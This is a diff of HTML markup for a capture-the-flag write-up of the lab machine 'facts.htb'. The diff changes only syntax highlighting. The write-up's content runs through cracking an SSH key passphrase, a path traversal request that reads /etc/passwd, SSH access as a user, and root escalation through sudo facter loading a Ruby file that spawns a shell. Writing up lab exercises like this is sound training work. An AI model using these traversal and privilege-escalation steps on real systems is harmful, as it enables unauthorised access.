+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>dragonballz      (id_ed25519)     
+</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">User Enumeration</span>
     <div id="user-enumeration" class="anchor"></div>
@@ -1230,20 +1230,20 @@
     
 </h4>
 <p>To enumerate users I exploited another vulnerability. The <code>download_private_file</code> method contains a path traversal flaw:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">def</span> <span class="nf">download_private_file</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="n">cama_uploader</span><span class="o">.</span><span class="n">enable_private_mode!</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl">
-</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="n">file</span> <span class="o">=</span> <span class="n">cama_uploader</span><span class="o">.</span><span class="n">fetch_file</span><span class="p">(</span><span class="s2">&#34;private/</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:file</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl">
-</span></span><span class="line"><span class="ln">6</span><span class="cl">  <span class="n">send_file</span> <span class="n">file</span><span class="p">,</span> <span class="ss">disposition</span><span class="p">:</span> <span class="s1">&#39;inline&#39;</span>
-</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="k">end</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download_private_file</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  cama_uploader<span style="color:#f92672">.</span>enable_private_mode!
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>  file <span style="color:#f92672">=</span> cama_uploader<span style="color:#f92672">.</span>fetch_file(<span style="color:#e6db74">&#34;private/</span><span style="color:#e6db74">#{</span>params<span style="color:#f92672">[</span><span style="color:#e6db74">:file</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>  send_file file, <span style="color:#e6db74">disposition</span>: <span style="color:#e6db74">&#39;inline&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span><span style="color:#66d9ef">end</span></span></span></code></pre></div></div>
 <p>The <code>file</code> parameter is not sanitized, allowing directory traversal:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd</span></span></code></pre></div></div>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> cat passwd
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">...[snip]...
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">trivia:x:1000:1000:facts.htb:/home/trivia:/bin/console
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">william:x:1001:1001::/home/william:/bin/console
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ cat passwd
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>...[snip]...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>trivia:x:1000:1000:facts.htb:/home/trivia:/bin/console
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>william:x:1001:1001::/home/william:/bin/console
+</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">shell as trivia</span>
     <div id="shell-as-trivia" class="anchor"></div>
@@ -1255,12 +1255,12 @@
     
 </h3>
 <p>using ssh with private key i gained access to trivia</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> ssh -i id_ed25519 trivia@10.129.23.220                                                   
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">Enter passphrase for key &#39;id_ed25519&#39;: 
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">...[snip]...
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">trivia@facts:/home/william$ cat /home/william/user.txt 
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="go">7d4a27*********************
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ ssh -i id_ed25519 trivia@10.129.23.220                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Enter passphrase for key &#39;id_ed25519&#39;: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>...[snip]...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>trivia@facts:/home/william$ cat /home/william/user.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>7d4a27*********************
+</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">shell as root</span>
     <div id="shell-as-root" class="anchor"></div>
@@ -1282,23 +1282,23 @@
     
 </h4>
 <p>Checked sudo permissions:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="go">trivia@facts:~$ sudo -l
-</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">Matching Defaults entries for trivia on facts:
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">    env_reset, mail_badpass,
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="go">User trivia may run the following commands on facts:
-</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="go">    (ALL) NOPASSWD: /usr/bin/facter
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>trivia@facts:~$ sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Matching Defaults entries for trivia on facts:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>User trivia may run the following commands on facts:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    (ALL) NOPASSWD: /usr/bin/facter
+</span></span></code></pre></div></div>
 <p>The first <code>.rb</code> file in the <code>/path/to/dir/</code> directory will be executed.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="go">trivia@facts:~$ cat priv.rb
-</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">exec(&#34;/bin/console&#34;)
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">trivia@facts:~$ sudo facter --custom-dir=.
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">root@facts:/home/trivia# id
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="go">uid=0(root) gid=0(root) groups=0(root)
-</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="go">root@facts:/home/trivia# cat /root/root.txt
-</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="go">5f9c237****************************
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>trivia@facts:~$ cat priv.rb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>exec(&#34;/bin/console&#34;)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>trivia@facts:~$ sudo facter --custom-dir=.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>root@facts:/home/trivia# id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>root@facts:/home/trivia# cat /root/root.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>5f9c237****************************
+</span></span></code></pre></div></div>
 
           
           
